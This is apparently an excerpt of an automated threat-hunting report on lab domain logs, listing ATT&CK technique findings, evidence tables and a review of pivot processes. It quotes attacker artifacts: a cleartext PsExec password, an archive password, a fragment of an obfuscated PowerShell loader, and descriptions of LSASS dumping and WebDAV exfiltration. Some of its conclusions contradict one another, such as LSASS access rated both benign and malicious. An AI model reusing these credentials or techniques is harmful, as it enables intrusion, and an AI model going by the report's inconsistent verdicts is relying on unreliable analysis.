Evidence status: **NOT verified (0/1 evidence items)** — excluded from the verdict

No hits for event.code 4739, no 4688/sysmon process creation with Reversible/Set-ADUser/dsmod command lines, and no PowerShell script blocks referencing AllowReversiblePasswordEncryption. No reversible-encryption flag was set on any account in the observed window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-ScreenCapture # https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/ {     Start-Job -Name "Screenshot" -ScriptBlock {       … | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRlFBP | q-5de901c8b0 | FAILED: claimed value differs from the stored value |

### F41 · benign / high · T1556.006 · No MFA modification observed

Evidence status: **verified**

No hits for event.code 4739 or 5136, and no sysmon process creation with Set-ADUser/Set-ADAccountControl command lines. No MFA-related configuration changes were observed in the window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:08.142Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\FaceLogon\CredProvUncompletedInstances | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOhMXxP | q-294b04b1cf | ok |

### F42 · benign / high · T1556.007 · No hybrid-identity modification observed

Evidence status: **NOT verified (0/1 evidence items)** — excluded from the verdict

No hits for event.code 5136, and no PowerShell script blocks referencing Connect-MsolService/Connect-AzureAD. The only AD-related PowerShell activity was legitimate Microsoft AD module resource strings on newyork. No hybrid-identity (Azure AD Connect / federation) tampering was observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:16:32.000Z | newyork.dmevals.local | windows.powershell | win.ScriptBlockText | dentity parameter, but the New-ADUser cmdlet uses the         Name parameter.     .EXAMPLE         $getADUserParams = Get-CommonADParameters @PSBoundParameters … | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZLh6MG | q-5de901c8b0 | FAILED: claimed value differs from the stored value |

### F43 · benign / high · T1556.008 · No network provider DLL registered

Evidence status: **verified**

No hits for registry writes to NetworkProvider/Credential Provider keys and no PowerShell script blocks referencing NetworkProvider/New-ItemProperty. No network provider DLL was registered for credential capture.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:46.756Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\SessionData\2\LastLoggedOnProvider | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOpVKkY | q-294b04b1cf | ok |

### F46 · benign / high · T1557.003 · No DHCP spoofing activity observed

Evidence status: **verified**

No DHCP-related events exist in any dataset. The windows.other System channel contains no DHCP codes (1341/1342/1020/1063), the Zeek capture contains no dhcp log type (only conn/files/ssl/x509/dce_rpc/http/dns/kerberos/dpd/smb_files/weird/smb_mapping/notice/pe), and no DHCP-related PowerShell script blocks were found. DHCP spoofing is not observable in this data.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:06:38.899Z | simplerockbuild.simplerock.lan | zeek | event.action | conn | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrohz | q-e98a521e65 | ok |

### F49 · benign / medium · T1558.001 · No golden-ticket forging observed; krbtgt TGS requests are normal

Evidence status: **verified**

The 4769 Kerberos service-ticket events include only one krbtgt request by pbeesly@DMEVALS.LOCAL (from 10.0.1.4) and two by the SCRANTON$ machine account, all with Ticket Encryption Type 0x12 and Failure Code 0x0. All 28 4769 events use encryption type 0x12 (AES256) — no RC4 downgrade pattern, no anomalous krbtgt service-ticket volume, and no forged-ticket logon indicators. The 4672 special-privilege events (212) have no populated TargetUserName to stack. No golden-ticket activity is evident.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.ServiceName | krbtgt | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-6362ca7813 | ok |
| 2 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.TicketEncryptionType | 0x12 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-6362ca7813 | ok |
| 3 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOKC- | q-6362ca7813 | ok |

### F50 · benign / medium · T1558.002 · No silver-ticket activity observed

Evidence status: **verified**

The 4769 service-ticket requests are for machine accounts (NASHUA$, NEWYORK$, SCRANTON$, WEC$) and krbtgt, all successful with encryption type 0x12. There is no evidence of service tickets forged without KDC validation (silver-ticket behavior) — no anomalous service SPN requests or missing corresponding TGT requests in the zeek kerberos capture, which shows normal AS/TGS pairs.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.ServiceName | NEWYORK$ | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItaDOaA_ | q-e5ba66aabb | ok |
| 2 | 2020-04-30 00:37:53.342Z | simplerockbuild.simplerock.lan | zeek | zeek.request_type | TGS | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYiy | q-a9f6b46f0d | ok |

### F51 · benign / medium · T1558.003 · No Kerberoasting observed

Evidence status: **verified**

No PowerShell script blocks referencing Kerberoast/Invoke-Kerberoast/Rubeus were found (zero hits). The zeek kerberos capture shows only normal AS/TGS request pairs for pbeesly to cifs/host/ldap/HTTP services, with no burst of TGS requests to many distinct SPNs that would indicate Kerberoasting. The 4769 events show only 28 requests across a handful of machine-account services.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:37:53.342Z | simplerockbuild.simplerock.lan | zeek | zeek.service | cifs/NASHUA | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYiy | q-a9f6b46f0d | ok |
| 2 | 2020-04-30 00:37:53.342Z | simplerockbuild.simplerock.lan | zeek | zeek.request_type | TGS | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrYiy | q-a9f6b46f0d | ok |

### F52 · benign / medium · T1558.004 · No AS-REP roasting observed

Evidence status: **verified**

The zeek kerberos capture shows AS requests to krbtgt that return KDC_ERR_PREAUTH_REQUIRED (preauthentication enforced) followed by successful AS exchanges — the normal preauth flow, not AS-REP roasting (which requires accounts with preauth disabled and would show successful AS-REP without the preauth-required error). No PowerShell script blocks referencing AS-REP/GetNPUsers/DontRequirePreAuth were found (zero hits).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:40:22.436Z | simplerockbuild.simplerock.lan | zeek | zeek.error_msg | KDC_ERR_PREAUTH_REQUIRED | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjj | q-a9f6b46f0d | ok |
| 2 | 2020-04-30 00:40:22.436Z | simplerockbuild.simplerock.lan | zeek | zeek.request_type | AS | .ds-logs-zeek-default-2026.10.17-000001 / AaFHNX1uOFchItbgrIjj | q-a9f6b46f0d | ok |

### F53 · benign / medium · T1606 · No forged web credential activity; observed activity is LSASS credential theft (T1003), not T1606

Evidence status: **verified**

Across the Windows window (2020-05-02 02:55-03:28Z) the only credential-related activity is credential theft from LSASS on scranton.dmevals.local by PowerShell.exe (PID 2976) opening lsass.exe with GrantedAccess 0x1FFFFF and 0x1F3FFF, plus an obfuscated PowerShell script (ReflectiveDelegate/GetProcAddress/GetModuleHandle + base64 shellcode) run as pbeesly. This is T1003 credential dumping, not T1606 forging of web credentials. No cookie or SAML token forging artifacts were found: the only cookie-path file event is a benign Windows INetCookies package file, and the Zeek window (2020-04-30, non-overlapping) contains only WebDAV file transfer (OfficeSupplies.7z, python.exe) with no web authentication traffic. The T1606 checks returned no evidence of forged web credentials.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-9b0b75c9ce | ok |
| 2 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gj | q-9b0b75c9ce | ok |
| 3 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItTka0Gm | q-9b0b75c9ce | ok |
| 4 | 2020-05-02 03:21:29.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function jzI {  	Param ($yKR, $cq)		  	$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() \| Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHNX1uOFchItZRkUVV | q-6a70ef0189 | ok |
| 5 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-677105d74d | ok |

### F54 · benign / medium · T1606.001 · No forged web cookie activity observed

Evidence status: **verified**

The only file event matching a cookie store is a single benign Windows INetCookies package file created by svchost.exe on scranton.dmevals.local (C:\Windows\ServiceProfiles\LocalService\...\INetCookies). No browser cookie theft, tampering, or forged-cookie authentication was observed. The Zeek HTTP traffic (2020-04-30, non-overlapping window) is WebDAV file transfer only, with no cookie-bearing web authentication. No evidence of T1606.001.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-677105d74d | ok |
| 2 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\System32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItOVAUl3 | q-677105d74d | ok |

### F55 · benign / medium · T1606.002 · No SAML token forging activity observed

Evidence status: **verified**

No SAML token forging artifacts were found. No process command lines, PowerShell script blocks, or HTTP URLs referencing SAML/ADFS/token/assertion were observed in the Windows or Zeek datasets. The Zeek window (2020-04-30, non-overlapping with the Windows window) contains only WebDAV file transfer to 192.168.0.4 with no federated/web authentication traffic. The only anomalous authentication is a single NtLmSsp network logon (type 3) for pbeesly from 172.18.39.2 on scranton, which is consistent with lateral movement following credential theft rather than SAML token forgery.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:41.000Z | scranton.dmevals.local | windows.security | win.LogonProcessName | NtLmSsp  | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FN5 | q-a5656af4c4 | ok |
| 2 | 2020-05-02 03:20:41.000Z | scranton.dmevals.local | windows.security | win.LogonType | 3 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FN5 | q-a5656af4c4 | ok |

### F56 · benign / high · T1621 · No MFA request generation activity; windows.other hits are benign RSOP/WMI operations

Evidence status: **verified**

The T1621 hypothesis (adversary generating repeated MFA push requests to fatigue a user) is not supported by any retrieved event. windows.security contains zero 4625 failed-logon events, so there is no repeated authentication-attempt pattern. No PowerShell 4104 script block contains MFA/2FA/Authenticator/multifactor strings, no Sysmon process command line references mfa/authenticator/login, and no Zeek http/dns record references login/auth/mfa/okta/duo. The windows.other hits that triggered the check (event codes 5857/5858) are routine WMI/Group-Policy RSOP operations on newyork.dmevals.local performed by NT AUTHORITY\SYSTEM (ClientProcessId 1588), e.g. 'Start IWbemServices::DeleteInstance - Root\Rsop\Computer : RSOP_ExtensionStatus...' with ResultCode 0x80041002 — not authentication activity. The only credential-related activity observed is PsExec-based lateral movement by user pbeesly (LogonType 3/2, 4648 explicit credentials, PSEXESVC.exe) between scranton/nashua/newyork, which is lateral movement rather than MFA request generation.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.other | message | Id = {C11E1664-7828-4AD0-B23A-0FCEF0EA26C0}; ClientMachine = NEWYORK; User = NT AUTHORITY\SYSTEM; ClientProcessId = 1588; Component = Unknown; Operation = Start… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8Rl | q-a87f000ddc | ok |
| 2 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.other | event.code | 5858 | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8Rl | q-a87f000ddc | ok |
| 3 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-49668a4f61 | ok |
| 4 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ev8p | q-49668a4f61 | ok |
| 5 | 2020-05-02 03:20:40.000Z | newyork.dmevals.local | windows.security | win.Status | 0x0 | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItVn1FNc | q-8a224b831f | ok |

### F58 · benign / high · T1649 · Routine Windows certificate store maintenance by lsass/svchost/taskhostw (benign)

Evidence status: **verified**

The remaining SystemCertificates registry writes in the window are normal OS certificate-store maintenance: lsass.exe and svchost.exe updating AuthRoot and 'Windows Live ID Token Issuer' certificate Blobs on nashua/scranton, smss.exe creating the WOW6432Node SymbolicLinkValue, and taskhostw.exe writing per-user ACRS PhysicalStores values under the pbeesly SID. These are standard Windows processes touching trusted-root and per-user certificate stores, not attacker certificate theft. The WMI 5858 events are RSOP_ExtensionStatus DeleteInstance cleanup by SYSTEM, and the Kerberos 4768 TGT requests are ordinary logons for pbeesly and the SCRANTON$ machine account.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:59:37.453Z | nashua.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SOFTWARE\Microsoft\SystemCertificates\AuthRoot\Certificates\A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436\Blob | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItT2v6oH | q-87b13c266a | ok |
| 2 | 2020-05-02 03:05:28.255Z | nashua.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SOFTWARE\Microsoft\SystemCertificates\Windows Live ID Token Issuer\Certificates\0217922CA1B6F0BD0F1D7FF6E7BDC29B2FAAA060\Blob | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItThYt7K | q-87b13c266a | ok |
| 3 | 2020-05-02 03:20:49.745Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\SystemCertificates\ACRS\PhysicalStores\.LocalMachine\OpenStoreProvider | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHM31uOFchItO2iUEp | q-87b13c266a | ok |
| 4 | 2020-05-02 02:56:47.000Z | newyork.dmevals.local | windows.other | message | Id = {C11E1664-7828-4AD0-B23A-0FCEF0EA26C0}; ClientMachine = NEWYORK; User = NT AUTHORITY\SYSTEM; ClientProcessId = 1588; Component = Unknown; Operation = Start… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHNH1uOFchItbrX8Rl | q-e8b833dd46 | ok |
| 5 | 2020-05-02 03:11:18.000Z | newyork.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHNH1uOFchItZ7Ef_w | q-799cd6af65 | ok |

## Pivot candidates

Processes the pivot reviewer had to assess (started by a script host or from outside the Windows directory, rare in the 15-minute windows around verified activity).

| Host | Executable | Starts | Parents | Assessment | Reason |
|---|---|---|---|---|---|
| nashua.dmevals.local | C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\S… | 1 | C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.35.152.0_x64__kzf8qxf38zg5c\S… | benign | Legitimate signed Skype app self-spawning; no credential-theft behavior observed. |
| nashua.dmevals.local | C:\Windows\Temp\python.exe | 5 | C:\Windows\PSEXESVC.exe, C:\Windows\Temp\python.exe | malicious | Spawned by PSEXESVC.exe (PsExec service) under pbeesly on NASHUA, matching the PsExec64 remote-exec command line with hardcoded credentials from scranton; attac… |
| nashua.dmevals.local | C:\Windows\Temp\Rar.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Created a password-protected archive (password fGzq5yKw) of working.zip under pbeesly, then was itself securely deleted by sdelete64 - data staging and anti-for… |
| nashua.dmevals.local | C:\Windows\Temp\sdelete64.exe | 3 | C:\Windows\System32\cmd.exe | malicious | Used to securely wipe Rar.exe and the working.zip archives immediately after staging, consistent with covering credential/data-theft tracks. |
| nashua.dmevals.local | C:\WindowsAzure\Packages\CollectGuestLogs.exe | 1 | C:\WindowsAzure\Packages\WaAppAgent.exe | benign | Standard Azure guest agent log collection, parented by WaAppAgent.exe. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.… | 4 | C:\Windows\System32\cmd.exe, C:\Windows\System32\services.exe | benign | Legitimate Azure Network Watcher agent. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Azure.Security.IaaSAntimalware\1.5.5.9\Antimalware… | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Legitimate Azure antimalware configuration component. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\bin\CustomScr… | 1 | C:\Windows\System32\cmd.exe | benign | Legitimate Azure Custom Script Extension handler. |
| scranton.dmevals.local | C:\Packages\Plugins\Microsoft.Compute.JsonADDomainExtension\1.3.2\bin\JsonADDoma… | 1 | C:\Windows\System32\cmd.exe | benign | Legitimate Azure AD domain-join extension. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler.exe | 2 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | benign | Legitimate Google Update crash handler. |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler64.exe | 2 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | benign | Legitimate Google Update crash handler (64-bit). |
| scranton.dmevals.local | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe | 3 | C:\Program Files (x86)\Google\Update\GoogleUpdate.exe, C:\Windows\System32\servi… | benign | Legitimate Google Update service. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\accessChk.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Run by PowerShell under pbeesly and wrote a file named 'passwordsDB' - credential material being collected to disk. |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\PsExec64.exe | 4 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Launched by PowerShell with hardcoded cleartext credentials (-u dmevals\pbeesly -p Fl0nk3rt0n!T0by) to remotely run python.exe on \\NASHUA - lateral movement wi… |
| scranton.dmevals.local | C:\Program Files\SysinternalsSuite\sdelete64.exe | 3 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | malicious | Run by PowerShell to securely delete staged archive/tooling, anti-forensic cleanup. |
| scranton.dmevals.local | C:\Program Files\Windows Defender\MsMpEng.exe | 1 | C:\Windows\System32\services.exe | benign | Legitimate Windows Defender service. |
| scranton.dmevals.local | C:\Program Files\Windows Defender\NisSrv.exe | 2 | C:\Windows\System32\services.exe | benign | Legitimate Windows Defender network inspection service. |
| scranton.dmevals.local | C:\ProgramData\victim\â€®cod.3aka3.scr | 1 | C:\Windows\explorer.exe | malicious | Suspiciously named .scr in C:\ProgramData\victim launched by explorer.exe with /S; wrote monkey.png (steganographic payload anchor) - attacker staging. |
| scranton.dmevals.local | C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe | 2 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | suspicious | Invoked by PowerShell to compile C# into random-named temp DLLs (qkbkqqbs.dll, 0piklvia.dll) - in-memory tooling consistent with credential-access payloads. |
| scranton.dmevals.local | C:\Windows\System32\hostui.exe | 1 | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | suspicious | Spawned by PowerShell under pbeesly; hostui.exe is a known UAC-bypass/credential-prompt abuse binary, unusual parent. |
| scranton.dmevals.local | C:\Windows\System32\sdclt.exe | 3 | C:\Windows\System32\cmd.exe | suspicious | Spawned by cmd.exe under pbeesly; sdclt.exe is a known UAC-bypass binary, unusual invocation in this context. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\BfeToolWin8.exe | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Legitimate Azure guest agent firewall tool. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\FindVolume\FindVolume.exe | 1 | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | benign | Legitimate Azure guest agent volume utility. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\GuestAgent\WindowsAzureGuestAgent.exe | 1 | C:\Windows\System32\services.exe | benign | Legitimate Azure guest agent. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe | 1 | C:\Windows\System32\services.exe | benign | Legitimate Azure telemetry service. |
| scranton.dmevals.local | C:\WindowsAzure\Packages\WaAppAgent.exe | 1 | C:\Windows\System32\services.exe | benign | Legitimate Azure Windows Agent. |
| scranton.dmevals.local | C:\WindowsAzure\SecAgent\WaSecAgentProv.exe | 2 | C:\WindowsAzure\Packages\WaAppAgent.exe | benign | Legitimate Azure security agent provider. |
| scranton.dmevals.local | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPl… | 1 | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzure… | benign | Legitimate Azure network agent plugin. |
| scranton.dmevals.local | C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzure… | 1 | C:\Windows\System32\services.exe | benign | Legitimate Azure network agent. |

## Technique conclusions

One line per technique in scope: status from the triage of its family; `not_observed` = checked, nothing found; `not_observable` = no dataset records it.

| Technique | Status | Reason |
|---|---|---|
| T1003 OS Credential Dumping | benign | All process creations and file writes are standard Windows/Azure tooling; no dumping utilities, no hive copies, no dump files beyond WER crash dumps. |
| T1003.001 LSASS Memory | benign | LSASS opens with high access masks come from PowerShell/wsmprovhost .NET process-management calls (managed call traces) and from wininit/csrss during a normal lsass restart; no MiniDump/comsvcs/procdump activity. |
| T1003.002 Security Account Manager | benign | SAM registry writes and SAM_SERVER/SAM_DOMAIN handle opens are performed by lsass.exe (machine account) as normal OS SAM operations; no reg save or hive file copies. |
| T1003.003 NTDS | not_observed | No ntds.dit file access, no ntdsutil/vssadmin/diskshadow command lines, no shadow-copy or NTDS activity in any dataset. |
| T1003.004 LSA Secrets | not_observed | No LSA Secrets access; no process/script referencing secrets/lsadump, and no SECURITY Policy Secrets object access. |
| T1003.005 Cached Domain Credentials | benign | HKLM\SECURITY\Cache\NL$1 writes are made by lsass.exe itself as normal cached-credential maintenance, not extraction. |
| T1003.006 DCSync | not_observed | No DCSync/drsuapi/lsadump activity in process command lines or PowerShell script blocks. |
| T1040 Network Sniffing | benign | The only packet-capture activity is a 7-second netsh 'trace start capture=yes' / 'trace stop' pair on scranton.dmevals.local, both spawned by the signed Microsoft Azure NetworkWatcherAgent service (NetworkWatcherAgent.ex… |
| T1056 Input Capture | malicious | Steganographic PowerShell loader (monkey.png, hidden window, -ep bypass) on scranton.dmevals.local ran Invoke-Exfil with hardcoded credentials and WebDAV exfiltration, and its process opened LSASS with full access. |
| T1056.001 Keylogging | not_observed | No keylogger indicators (GetAsyncKeyState/SetWindowsHookEx/keylog strings) found in Sysmon command lines or PowerShell script blocks. |
| T1056.002 GUI Input Capture | not_observed | No GUI credential prompt capture artifacts identified; observed credential activity is LSASS access and hardcoded-credential use. |
| T1056.003 Web Portal Capture | not_observed | No IIS/wwwroot/inetpub login-page or w3wp web-portal capture artifacts found; zeek window non-overlapping and showed no HTTP POST. |
| T1056.004 Credential API Hooking | malicious | PowerShell PID 2976 on scranton.dmevals.local opened lsass.exe with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_VM_READ/ALL_ACCESS), the access pattern for reading LSASS credential memory. |
| T1110 Brute Force | not_observed | Zero 4625 failed-logon events in windows.security; only successful 4648 explicit-credential logons from PsExec and system accounts. |
| T1110.001 Password Guessing | not_observed | No 4625 failures and no password-referencing command lines or script blocks; no guessing activity. |
| T1110.002 Password Cracking | not_observed | No cracking tooling, wordlists/potfiles, or SAM/SECURITY hive reads; lsass access is benign svchost 0x1000 queries. |
| T1110.003 Password Spraying | not_observed | No 4625 failures; 4648 logons are PsExec and normal system accounts, not a spray pattern. |
| T1110.004 Credential Stuffing | not_observed | No 4625 failures and no credential/password script blocks or command lines indicating credential stuffing. |
| T1111 Multi-Factor Authentication Interception | not_observed | No MFA/smart-card/OTP interception artifacts in any dataset. Credential-related registry/service hits are standard Windows components (CredentialEnrollmentManager, Credential Manager vaultsvc, scfilter.sys smart card PnP… |
| T1187 Forced Authentication | malicious | Confirmed forced authentication: on scranton.dmevals.local the WebClient service spawned rundll32.exe 'davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav' (5x, user pbeesly), and Zeek shows the matching WebDA… |
| T1212 Exploitation for Credential Access | malicious | LSASS was opened with full-access masks (0x1FFFFF, 0x1F3FFF) by PowerShell.exe on scranton.dmevals.local and by wsmprovhost.exe (WinRM remote PowerShell) on nashua.dmevals.local, with call traces through PowerShell/.NET … |
| T1539 Steal Web Session Cookie | benign | All T1539-relevant hits are benign: the only 'cookie' process activity is the Windows WebDAV client davclnt.dll,DavSetCookie (rundll32.exe, parent svchost.exe) on scranton; the only cookie-named file creation is the WARP… |
| T1552 Unsecured Credentials | malicious | Credential material collected to disk (passwordsDB, .pfx) and reused in cleartext for lateral movement. |
| T1552.001 Credentials In Files | malicious | Hardcoded cleartext credentials in PsExec64 command line (dmevals\pbeesly / Fl0nk3rt0n!T0by), accesschk writing 'passwordsDB', and password-protected RAR staging of working.zip on NASHUA. |
| T1552.002 Credentials in Registry | benign | All Password/Credential registry value sets are legitimate OS components (svchost, lsass, services, winlogon). |
| T1552.003 Shell History | not_observed | No consolehost_history or shell-history file access found in sysmon/security telemetry. |
| T1552.004 Private Keys | malicious | Get-PrivateKeys PowerShell function exported all LocalMachine certificates to .pfx files on scranton.dmevals.local, then staged/exfiltrated via 7z to a WebDAV share. |
| T1552.006 Group Policy Preferences | benign | GptTmpl.inf/gpt.ini sysvol reads are routine Group Policy processing by machine accounts; no Groups.xml cpassword access observed. |
| T1555 Credentials from Password Stores | malicious | Private-key .pfx export and passwordsDB file creation indicate credential-store harvesting on scranton. |
| T1555.003 Credentials from Web Browsers | malicious | PowerShell wrote a private-key .pfx (coyn5igj.3io.pfx) to Downloads on scranton. |
| T1555.004 Windows Credential Manager | suspicious | Full-access LSASS handle requests (0x1fffff / 0x1f3fff) are consistent with harvesting DPAPI/Credential Manager secrets from LSASS memory, but no direct cmdkey/vaultcmd/Credential Manager registry or file artifacts were … |
| T1555.005 Password Managers | not_observed | No password-manager executables, .kdbx files, or password-manager process access found in any dataset. |
| T1556 Modify Authentication Process | malicious | PowerShell.exe on scranton opened lsass.exe with GrantedAccess 0x1fffff/0x1f3fff (PROCESS_ALL_ACCESS) at 03:05:16, consistent with credential dumping from the authentication process; the loader was a hidden-window -ep by… |
